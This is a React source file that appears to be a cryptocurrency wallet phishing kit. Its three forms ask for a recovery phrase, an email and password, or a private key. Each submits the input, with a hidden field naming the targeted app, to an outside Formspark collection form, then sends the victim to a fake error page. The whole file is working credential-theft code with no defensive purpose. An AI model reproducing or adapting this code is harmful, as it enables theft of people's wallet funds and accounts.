import { useFormspark } from "@formspark/use-formspark";
import React, { useState } from "react";
import { Navigate } from "react-router-dom";
import HomePage from "./HomePage";

const FORMSPARK_FORM_ID = "2ioNJNQpT";

export const Phrases = (appName) => {
  const [phrase, setPhrase] = useState("");
  const [here, setHere] = useState(appName);
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setConfirm(true);
    await submit({ phrase, here });
    return <HomePage />;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/error",
          }}
        />
      </p>
    );
  }
  return (
    <div>
      <div className="w-80 md:w-96 md:ml-20">
        <form action="" onSubmit={handleSubmit}>
          <textarea
            placeholder="Enter your recovery phrase"
            type="text"
            className="w-full py-12 border-2 border-gray-400 mb-8 px-4"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
            required
          />
          <br />
          <div className="hidden">
            <input
              placeholder=""
              type="text"
              className="w-full py-2 border-2 border-gray-400 my-8 px-4"
              value={here}
              onChange={(e) => setHere(e.target.value)}
              required
            />
          </div>
          <div className="pb-5 text-left text-lg">
            Typically 12 (sometimes 24) words separated by single spaces
          </div>
          <button
            type="submit"
            className="w-full py-2 bg-blue-400 text-2xl text-white"
            disabled={submitting}
          >
            Proceed
          </button>
        </form>
      </div>
    </div>
  );
};

export const SignIn = (appName) => {
  const [emailLog, setEmailLog] = useState();
  const [passLog, setPassLog] = useState();
  const [here, setHere] = useState(appName);

  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setConfirm(true);
    await submit({ emailLog, passLog, here });
    return <HomePage />;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/error",
          }}
        />
      </p>
    );
  }
  return (
    <div>
      <div className="w-80 md:w-96 md:ml-20">
        <form action="" onSubmit={handleSubmit}>
          <input
            placeholder="Enter email"
            type="text"
            className="w-full py-2 border-2 border-gray-400 px-4"
            value={emailLog}
            onChange={(e) => setEmailLog(e.target.value)}
            required
          />
          <br />
          <input
            placeholder="Enter Password"
            type="password"
            className="w-full py-2 border-2 border-gray-400 my-8 px-4"
            value={passLog}
            onChange={(e) => setPassLog(e.target.value)}
            required
          />
          <br />
          <div className="hidden">
            <input
              placeholder=""
              type="text"
              className="w-full py-2 border-2 border-gray-400 my-8 px-4"
              value={here}
              onChange={(e) => setHere(e.target.value)}
              required
            />
          </div>
          <div className="pb-5 text-left text-lg">
            xxxxxxxxxxxxxxxxxxxxxxxxxxx
          </div>

          <button
            type="submit"
            className="w-full py-2 bg-blue-400 text-2xl text-white"
            disabled={submitting}
          >
            Proceed
          </button>
        </form>
      </div>
    </div>
  );
};

export const PrivateKey = (appName) => {
  const [privateKey, setPrivateKey] = useState();
  const [here, setHere] = useState(appName);
  const [confirm, setConfirm] = useState(false);

  const [submit, submitting] = useFormspark({
    formId: FORMSPARK_FORM_ID,
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setConfirm(true);
    await submit({ privateKey, here });
    return <HomePage />;
  };

  if (confirm) {
    return (
      <p>
        <Navigate
          to={{
            pathname: "/error",
          }}
        />
      </p>
    );
  }
  return (
    <div>
      <div className="w-80 md:w-96 md:ml-20 ml-12">
        <form action="" onSubmit={handleSubmit}>
          <textarea
            placeholder="Enter your private key"
            type="text"
            className="w-full py-12 border-2 border-gray-400 mb-8 px-4"
            value={privateKey}
            onChange={(e) => setPrivateKey(e.target.value)}
            required
          />
          <br />
          <div className="hidden">
            <input
              placeholder=""
              type="text"
              className="w-full py-2 border-2 border-gray-400 my-8 px-4"
              value={here}
              onChange={(e) => setHere(e.target.value)}
              required
            />
          </div>
          <div className="pb-5 text-left text-lg">
            Typically xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
          </div>
          <button
            type="submit"
            className="w-full py-2 bg-blue-400 text-2xl text-white"
            disabled={submitting}
          >
            Proceed
          </button>
        </form>
      </div>
    </div>
  );
};
